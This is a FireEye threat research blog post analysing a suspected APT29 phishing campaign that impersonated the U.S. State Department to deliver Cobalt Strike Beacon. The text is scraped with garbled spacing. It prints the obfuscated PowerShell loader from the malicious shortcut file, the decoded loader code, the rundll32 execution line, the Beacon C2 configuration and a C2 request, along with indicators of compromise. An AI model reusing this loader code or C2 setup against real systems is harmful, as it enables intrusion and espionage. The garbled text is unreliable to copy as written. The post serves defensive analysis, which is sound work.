{
    "title": "not so cozy_ an uncomfortable examination of a suspected apt29 phishing campaign _ fireeye inc",
    "text": "Threat Research not So Co zy: an Uncomfo rtable Examination of a Suspected aPT29 Phishing Campaign novembe r 19, 2018  | by Matthew Dunwoody, andrew Thomp son, Ben Withnell , Jonathan Leathe ry, Michael Matonis, nick Carr SPEaR PHISHInG  PHISHInG  aPT Introduction FireEye devices detected intrusion attempt s against multiple industries, including think tank, la w enforcement, me dia, U.S. milita ry, image ry, transportation, pha rmaceutical, national gove rnment, an d defense contracting. The attempt s involve d a phishing email appea ring to be f rom the U.S. Depa rtment of State with links to zip files containing malicio us Windows shortcuts that delivered Cobalt St rike Beacon. Shared technical a rtifacts; tactics, techniq ues, and procedures (TTPs); and targeting connect thi s activity to previously observed activity suspected to be aPT 29. aPT29 is known to transition away from phishing implant s within ho urs of initial comp romise. On novembe r 14, 2018 , FireEye detected new targeted phishing activity at mo re than 20 of our clients across multiple industries. The attacke r appears to have comp romised the email server of a ho spital an d the corporate website of a consulting company in o rder to use their infrastructure to send phishing email s. The phi shing email s were made to look like secure comm unication f rom a P ublic affai rs official at the U.S. Depa rtment of State, ho sted on a page made to look like anothe r Department of State P ublic affai rs official' s personal drive, and used a legitimate Department of State fo rm as a decoy. Thi s information co uld be obtaine d via publicly available data, and there is no indication that the Depa rtment of State net work was involve d in this campaign. The attacke r used unique links in each phi shing email an d the link s that Fi reEye observed were used to download a ZIP archive that containe d a weaponized Windows shortcut file, launching both a benign decoy document an d a Cobalt St rike Beacon back door, customized by the attacke r to blen d in with legitimate net work traffic. Several element s from this campaign – incl uding the resources invested in the phi shing email an d network infrastructure, the meta data from the weaponized shortcut file payloa d, and the specific victim in dividuals and organizations targeted – are directly linke d to the la st observed aPT29 phishing campaign f rom novembe r 2016 . This blog po st explores those technical b readcrumbs and the po ssible intention s of this activity. attribution Challenge s Conclusive FireEye attribution is often obtaine d through our Mandiant con sulting team' s investigation of incidents at comp romised organizations, to identify details of the attack an d post-comp romise activity at victim s. FireEye is still analy zing this activity. There are several similarities and technical ove rlaps between the 14 novembe r 2018 , phishing campaign an d the suspected aPT29 phishing campaign on 9 novembe r 2016 , both of which occ urred shortly after U.S. election s. However, the ne w campaign incl uded creative ne w element s as well as a seemingly deliberate reuse of old phishing tactic s, techniq ues and procedures (TTPs), including using the same system to weaponize a Win dows shortcut (LnK) file. aPT 29 is a sophisticated actor, and while sophisticated actors are not infallible, seemingly blatant mi stakes are cause for pause when con sidering historical uses of deception by R ussian intelligence services. It has also been ove r a year since we have concl usively identified aPT29 activity, which raises questions about the timing an d the similarities of the activity afte r such a long inte rlude. notable similarities between this and the 2016  campaign incl ude the Win dows shortcut metadata, targeted organizations and specific in dividuals, phishing email con struction, an d the use of comp romised infrastructure. notable differences include the use of Cobalt St rike, rather than custom mal ware; however, many e spionage actors do use publicly an d comme rcially available f rameworks for reasons such as plausible deniability. During the phi shing campaign, the re were indications that the site hosting the mal ware was selectively serving payloads. For example, requests using inco rrect HTTP hea ders reportedly served ZIP archives containing only the benign p ublicly available Depa rtment of State fo rm. It is possible that the th reat acto r served additional an d different payloa ds depending on the link vi sited; however, FireEye has only ob served two: the benign an d Cobalt St rike variations. We provide details of this in the activity summary. analy sis of the campaign i s ongoing, an d we welcome any additional info rmation f rom the comm unity. activity S ummary The threat acto r crafted the phi shing email s to masquerade as a U.S. Depa rtment of State P ublic affai rs official sharing an official document. The link s led to a ZIP archive that containe d a weaponized Windows shortcut file hosted on a likely comp romised legitimate domain, jmj[.].com. The shortcut file was crafted to exec ute a PowerShell comman d that read, decoded, and executed additional co de from within the shortcut file. Upon exec ution, the shortcut file dropped a benign, p ublicly available, U.S. Depa rtment of State fo rm and Cobalt Strike Beacon. Cobalt St rike is a comme rcially available po st-exploitation f ramework. The B EaCOn payloa d was configured with a mo dified variation of the p ublicly available \"Pandora\" Malleable C 2 Profile and used a comman d and control (C2) domain – pan dorasong[.]com – a ssessed to be a ma squerade of the Pan dora music streaming service. The c ustomization of the C 2 profile may have been inten ded to defeat le ss resilient net work detection metho ds dependent on the default config urations. The shortcut metadata indicates it was built on the same or very similar system as the shortcut used in the novembe r 2016  campaign. The decoy content i s shown in Figure 1. Figure 1: Decoy document content Similarities to Older activity  Email Up dates Information an d insight on to day's advanced threats from FireEye. SHaRE Recent Po sts 09 Mar 2020 24 Feb 2020 20 Feb 2020 RSS FEED: STaY CO nnECTEDFirst name Last name Email address Company name Threat Research Blog FireEye Stories Blog Industry Perspective s Blog Yes, I would like to receive communication s from FireEye. Please read more about our information collection an d use. SUBSCR IBE Crescendo: Real Time Event Vie wer for macOS   Ransomware again st the Machine: How adversaries are Learning to Disrupt Industrial Production by Targeting IT and OT  M-Trends 2020 : Insights From the Front Line s   Home  FireEye Blog s Threat Research  not So Co zy: an Uncomfo rtable Examination of a S us...    Solutions Services Customers Partners Resources Company  This activity ha s TTP an d targeting ove rlap with previous activity, suspected to be aPT 29. The malicio us LnK used in the recent spearphishing campaign, ds7002.lnk  (MD5: 6ed0020 b0851 fb71d5b0076f4ee95f3c), has technical ove rlaps with a suspected aPT29 LnK from novembe r 2016 , 37486-the-shocking-truth-about- election-rigging-in-america.rtf.lnk  (MD5: f713d5d f826c6051 e65f995e57d681 7d), which was publicly reported by Volexity . The 2018  and 2016  LnK files are similar in structure and code, and contain significant meta data overlap, incl uding the MaC a ddress of the system on which the L nK was created. additional ove rlap was observed in the ta rgeting an d tactics employe d in the phi shing campaign s responsible for distributing the se LnK file. P revious aPT29 activity ta rgeted some of the same recipient s of this email campaign, an d aPT29 has leveraged large waves of email s in previous campaign s. Outlook an d Implication s analysis of this activity i s ongoing, b ut if the aPT 29 attribution is strengthene d, it would be the fi rst activity uncovered from this sophisticated group in at lea st a year. Given the widespread nature of the ta rgeting, organizations that have p reviously been ta rgeted by aPT 29 should take note of thi s activity. Fo r network defenders, whether or not thi s activity was conducted by aPT 29 should be secondary to properly investigating the full scope of the int rusion, which is of critical impo rtance if the el usive and deceptive aPT 29 operators indeed had access to your environment.   Technical Detail s Phishing Emails were sent from DOSOneDriveNotifications-svCT- Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]org with the subject Stevenson, Susan N shared \"TP18-DS7002 (UNCLASSIFIED)\" with you . The distribution of email s varied significantly bet ween the affecte d organizations. While mo st targeted FireEye customers received three or fewer emails, some received significantly mo re, with one c ustomer receiving 136. Each phi shing email containe d a unique malicio us URL, likely fo r tracking victim click s. The patte rn of this URL is shown in Fig ure 2. Figure 2: Malicio us URL structure Outside of the length of the sender email a ddress, which may have been t runcated on some recipient email clients, the attacke r made little effo rt to hide the true source of the email s, including that they were not act ually sent from the Depa rtment of State. Fig ure 3 provides a redacted snapshot of email hea ders from the phi shing message. Figure 3: Redacted email hea ders The malicio us links are known to have served two variants of the file ds7002.zip . The first variant (MD 5: 3fccf531ff0ae6fedd7c586774b17a2d), containe d ds7002.lnk  (MD5: 6ed0020 b0851 fb71d5b0076f4ee95f3c). ds7002.lnk  was a malicio us shortcut (LnK) file that containe d an embe dded BEaCOn DLL an d decoy PDF, an d was crafted to launch a Po werShell comman d. On exec ution, the Po werShell comman d extracted and executed the Cobalt St rike BEaCOn backdoor and decoy PDF. The othe r observed variant of ds7002.zip (MD5: 658c6fe38f95995 fa8dc8f6cfe41df7b) containe d only the benign decoy document. The decoy document ds7002.pdf  (MD5: 313f4808aa2a2073005d219 bc68971cd) appea rs to have been downloaded from hxxps://eforms.state.gov/Fo rms/ds7002.PDF. The BEaCOn backdoor communicated with the C 2 domain pandorasong[.]com (95.216.59[.]92) . The domain leveraged privacy p rotection, b ut had a start of authority (SOa) record containing vleger@tutanota.com . Our analysis indicates that the attacke r started configuring infrastructure approximately 30 days prior to the attack. Thi s is a significantly longe r delay than many othe r attacke rs we track. Table 1 contain s a timeline of thi s activity. Time Event Source 2018 -10-15 15:35:19Zpandorasong[.]com registered Registrant Information 2018 -10-15 17:39:00Zpandorasong[.]com SSL ce rtificate establishedCertificate T ransparency 2018 -10-15 18:52:06ZCobalt St rike server established Scan Data 2018 -11-02 10:25:58ZLnK Weaponi zed LnK Meta data 2018 -11-13 17:58:41Z3fccf531ff0ae6fedd7c586774b17a2d modifiedarchive Meta data 2018 -11-14 01:48:34Z658c6fe38f95995 fa8dc8f6cfe41df7b modifiedarchive Meta data 2018 -11-14 08:23:10ZFirst observed phishing e-mail sent Telemet ry Table 1: Operational timeline Execution Upon exec ution of the malicio us LnK, ds7002.lnk  (MD5: 6ed0020 b0851 fb71d5b0076f4ee95f3c), the follo wing PowerShell comman d was executed: \\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep bypass $zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5 rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE Vudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W 0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp O30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ 1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2en ZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZC gkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFy cmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJL kdldFN0cmluZygkb2UpO2lleCAkems7';$fz='FromBase'+0x40+'String';$rhia=[Text.E ncoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia; This comman d included some specific obf uscation, which may in dicate attempt s to bypa ss specific detection logic. Fo r example, the use of 'FromBase'+0x40+'String' , in place of F romBase64String, the Po werShell comman d used to decode base64. The decoded comman d consisted of additional Po werShell that read the content of ds7002.lnk  from offset 0x5e2be  to offset 0x623b6 , base64 decoded the ext racted content, an d executed it as additional Po werShell content. The embe dded PowerShell co de decoded to the follo wing: $ptgt=0x0005e2be;  $vcq=0x000623b6; $tb=\"ds7002.lnk\"; if (-not(Test-Path $tb)) { $oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse; if (-not $oe) {    exit } [IO.Directory]::SetCurrentDirectory($oe.DirectoryName); } $vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite'; $oe=New-Object byte[]($vcq-$ptgt); $r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin); $r=$vzvi.Read($oe,0,$vcq-$ptgt); $oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length); $zk=[Text.Encoding]::ASCII.GetString($oe); iex $zk; When the decoded PowerShell is compa red to the ol der 2016  PowerShell embe dded loader (Figure 4), it's clear that similarities still exist. However, the ne w activity leve rages randomized variable an d function name s, as well as obfuscating strings containe d in the script. Figure 4: Sha red functions to loader in older activity (XOR decode function an d CopyFilePa rt) The PowerShell loa der code is obfuscated, but a short de-obfuscated snippet i s shown as follows. The decoy PDF an d BEaCOn loader DLL are read from specific off sets within the L nK, decoded, and their content s executed. The BEaCOn loader DLL is executed with the expo rt function \"PointF unctionCall\": [TRUnCaTED] $jzffhy = [IO.FileAccess]::READ $gibisec = myayxvj $(\"ds7002.lnk\") $oufgke = 0x48bd8 $wabxu = 0x5e2be - $oufgke $lblij = bygtqi $gibisec $oufgke $wabxu $(\"%TEMP%\\ds7002.PDF\") Invoke-Item $((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35)) $oufgke = 0x0dd8 $wabxu = 0x48bd8 - $oufgke $yhcgpw = bygtqi $gibisec $oufgke $wabxu $(\"%LOCALAPPDATA%\\cyzfc.dat\") if ($ENV:PROCESSOR_ARCHITECTURE -eq $(\"AMD64\")) { & ($(\"rundll32.exe\")) $(\",\") $(\"PointFunctionCall\") } Files Dropped Upon successful execution of the L nK file, it dropped the follo wing files to the victim' s system: %APPDATA%\\Local\\cyzfc.dat  (MD5: 16bbc967a8b6a3658 71a05c74a4f345b) BEaCOn loader DLL %TEMP%\\ds7002.PDF  (MD5: 313f4808aa2a2073005d219 bc68971cd) Decoy document The dropped BEaCOn loader DLL was executed by RunDll32.exe using the expo rt function \"PointF unctionCall\": \"C:\\Windows\\system32\\rundll32.exe\"  C:\\Users\\Administrator\\AppData\\Local\\cyzfc.dat, PointFunctionCall The BEaCOn payloa d included the follo wing config uration: authorization_id: 0x311168c dns_sleep: 0 http_headers_c2_post_req:   Accept: */*   Content-Type: text/xml   X-Requested-With: XMLHttpRequest   Host: pandorasong.com http_headers_c2_request:   Accept: */*   GetContentFeatures.DLNA.ORG: 1   Host: pandorasong[.]com   Cookie:  __utma=310066733.2884534440.1433201462.1403204372.1385202498.7; jitter: 17 named_pipes: \\\\\\\\%s\\\\pipe\\\\msagent_%x process_inject_targets:   %windir%\\\\syswow64\\\\rundll32.exe   %windir%\\\\sysnative\\\\rundll32.exe beacon_interval: 300 c2:   conntype: SSL   host: pandorasong[.]com   port: 443 c2_urls:   pandorasong[.]com/radio/xmlrpc/v45   pandorasong[.]com/access/ c2_user_agents: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko network Comm unication s after successful installation/initiali zation of the mal ware, it ma de the follo wing callback to the C 2 server pandorasong[.]com via TCP/44 3 SSL. The sample was configured to use a malleable C 2 profile for its network communication s. The specific p rofile used appears to be a mo dified version of the publicly available Pan dora C2 profile. The profile may have been change d to bypa ss common detection s for the publicly available malleable profiles. The follo wing is a sample G ET request: GET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpep Bdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjd Mjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg agigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko HTTP/1.1 Accept: */* GetContentFeatures.DLNA.ORG: 1 Host: pandorasong.com Cookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7; User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko Connection: Keep-Alive Cache-Control: no-cache Similarities to Older activity Figure 5 and Figure 6 show the ove rlapping cha racteristics between the L nK used in the recent spear phish emails, ds7002.lnk  (MD5: 6ed0020 b0851 fb71d5b0076f4ee95f3c), compa red to a suspected aPT29 LnK from the novembe r 2016  attack that le d to the SP IKERUSH backdoor, 37486-the-shocking-truth-about-election- rigging-in-america.rtf.lnk  (MD5: f713d5d f826c6051 e65f995e57d681 7d).  Figure 5: LnK characteristics: new activity (left) an d old activity ( right) Figure 6: LnK characteristics: new activity (left) an d old activity ( right) In addition to similar LnK characteristics, the Po werShell comman d is very similar to the co de from the ol der sample that exec uted the SP IKERUSH backdoor. Some of the same va riable name s are retained in this new version, as seen in Fig ure 7 and Figure 8. Figure 7: Embedded PowerShell: ne w activity (left) an d old activity ( right) Figure 8: Shared string obfuscation logic: ne w LnK activity (left) an d old VERnaLDROP activity ( right) Indicators Indicator Description dosonedrivenotification s-svct- mailboxe 36625 aaa85747214aa50342836 a2315aaa36 928202 aa46271691a8255 aaa15382822 aa25821925 a 0245@northshorehealthgm[.]o rgPhishing email a ddress from likely comp romised legitimate server Stevenson, Susan n shared \"TP18-DS7002 (UnCLaSSIFIED)\" with youPhishing email subject https://www .jmj[.]com/pe rsonal/na uerthn_state_gov/*Malware hosting location on likely comp romised legitimate domain pandorasong[.]com BEaCOn C2 95.216.59[.]92Resolution of pandorasong[.]com 2b13b244aafe1ecace61ea1119a1b2eeSSL certificate fo r pandorasong[.]com 3fccf531ff0ae6fedd7c586774b17a2dMalicious ZIP archive MD5 658c6fe38f95995 fa8dc8f6cfe41df7b Benign Z IP archive MD 5 6ed0020 b0851 fb71d5b0076f4ee95f3c Malicious LnK file MD 5 313f4808aa2a2073005d219 bc68971cd Benign decoy PDF MD 5 16bbc967a8b6a3658 71a05c74a4f345b BEaCOn DLL MD 5 %aPPDaTa%\\Local\\cy zfc.dat BEaCOn DLL file path %TEMP%\\ds7002.PDFBenign decoy PDF file path Table 2: Indicators Related Sample s 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk  (MD5: f713d5d f826c6051 e65f995e57d681 7d) FireEye Detection FireEye detected this activity ac ross our platform. Table 3 contain s the specific detection name s that applie d to this activity. Product Detection name s network SecurityMalware.archive Malware.Binary.lnk Suspicious.Backdoor.Beacon Endpoint Sec uritySUSPICIOUS POW ERSHELL USaG E (METHODOLOGY) Generic.mg.16bbc967a8b6a365   PREVIOUS POST nEXT POSTThreat analytic s PlatformWInDOWS M ETHODOLOGY [Po werShell Ba se64 String] WInDOWS M ETHODOLOGY [R undll32 Roaming] WInDOWS M ETHODOLOGY [Po werShell Sc ript Block Wa rning] WInDOWS M ETHODOLOGY [Ba se64 Char args] TaDPOL E DOWnLOaDER [Rundll args] InTEL HIT - IP [Structured Threat Rep utation-Ba sed] InTEL HIT - FQD n [Structured Threat Rep utation-Ba sed] [DnS] InTEL HIT - FQD n [Structured Threat Rep utation-Ba sed] [non- DnS] InTEL HIT - FILE HaSH [Structured Threat Rep utation-Ba sed] Table 3: FireEye product detection s   Company Why Fi reEye? Customer Stories Careers Certification s and Compliance Investor Relation s Supplier Documents news and Events newsroom Press Releases Webina rs Events awards and Honors Email Preferences Technical S upport Incident? Report Security Issue Contact S upport Customer Portal Communities Documentation Po rtal FireEye Blog s Threat Research FireEye Stories Industry Perspective s Threat Map View the Late st Threats Contact U s +1 877-347-3393   Stay Connecte d  Copyright   2020  FireEye, Inc. all rights reserved.  Privacy & Cookie s Policy  | Privacy Shiel d | Legal Doc umentationSite Lang uage English  "
}